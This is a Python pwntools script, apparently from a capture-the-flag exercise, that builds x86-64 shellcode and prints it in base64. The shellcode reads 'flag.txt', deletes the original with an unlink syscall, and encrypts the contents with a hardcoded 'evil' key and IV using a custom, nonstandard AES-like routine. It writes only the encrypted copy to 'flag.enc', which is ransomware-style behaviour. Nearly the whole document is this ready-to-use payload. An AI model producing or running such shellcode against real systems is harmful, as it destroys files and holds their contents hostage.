from pwn import *
import base64


context.arch = 'amd64'
assembly = """
    sub rsp, 128

    mov rax, 2
    lea rdi, [rip+flag]
    xor rsi, rsi
    xor rdx, rdx

    syscall


    mov rax, 0
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 128

    syscall

    mov rax, 3
    mov rdi, 3
    syscall

    mov rax, 0x57
    lea rdi, [rip+flag]
    syscall

    mov rdi, rsp
    mov rsi, 128
    call aesencrypt

    mov rax, 2
    lea rdi, [rip+enc]
    mov rsi, 01
    or rsi, 64
    xor rdx, rdx

    syscall

    mov rax, 1
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 128

    syscall


    add rsp, 128
    ret

    aesencrypt:
    sub rsp, 384
    movdqu xmm1, OWORD PTR [rip+key]
    movdqu xmm5, xmm1
    mov r11, rdi
    add r11, rsi
    mov r10, rsp


    AESKEYGENASSIST  xmm2, xmm5, 0x1
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST  xmm2, xmm5, 0x3
    call key_expansion_128

    add r10, 16   
    AESKEYGENASSIST  xmm2, xmm5, 0x9
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST  xmm2, xmm5, 0x1b
    call key_expansion_128
    
    add r10, 16
    AESKEYGENASSIST  xmm2, xmm5, 0x51
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST  xmm2, xmm5, 0xf3
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST  xmm2, xmm5, 0xd9
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST  xmm2, xmm5, 0x8b
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST  xmm2, xmm5, 0xa1
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST  xmm2, xmm5, 0xe3
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST xmm2, xmm5, 0xa9
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST xmm2, xmm5, 0xfb
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST xmm2, xmm5, 0xf1
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST xmm2, xmm5, 0xd3
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST xmm2, xmm5, 0x79
    call key_expansion_128

    add r10, 16
    AESKEYGENASSIST xmm2, xmm5, 0x6b
    call key_expansion_128
    
    movdqu xmm2, OWORD PTR [rip+iv]

    encloop:

        movdqu xmm0, OWORD PTR [rdi]
        movdqu xmm1, OWORD PTR[rip+key]

        pxor xmm0, xmm2
        
        pxor xmm0, xmm1
        mov r10, rsp
        mov rcx, 0
        roundloop:
            movdqu xmm1, OWORD PTR [r10]
            aesenc xmm0, xmm1
            add r10, 16
            inc rcx

            cmp rcx, 15
        jl roundloop

        movdqu xmm1, OWORD PTR [r10]
        aesenclast xmm0, xmm1
        
        movdqu OWORD PTR [rdi], xmm0
        movdqu xmm2, xmm0
        add rdi, 16
        cmp rdi, r11
    jl encloop


    add rsp, 384
    ret

    key_expansion_128:
        pshufd xmm2, xmm2, 0xff
        vpslldq xmm3, xmm1, 0x4
        pxor xmm1, xmm3
        vpslldq xmm3, xmm1, 0x4
        pxor xmm1, xmm3
        vpslldq xmm3, xmm1, 0x4
        pxor xmm1, xmm3
        pxor xmm1, xmm2
        movdqu OWORD PTR[r10], xmm1
        movdqu xmm5, xmm1
        ret

    key:
    .string "niteveryevilkeys"

    iv:
    .string "veryevilinitvect"
    flag:
    .string "flag.txt"
    .byte 0x0
    enc:
    .string "flag.enc"
    .byte 0x0
"""


asms = asm(assembly)

print(disasm(asms))
print("Length:",len(asms),"bytes")
benc = base64.b64encode(asms)
print("Base64 encoded length:",len(benc))
print(benc)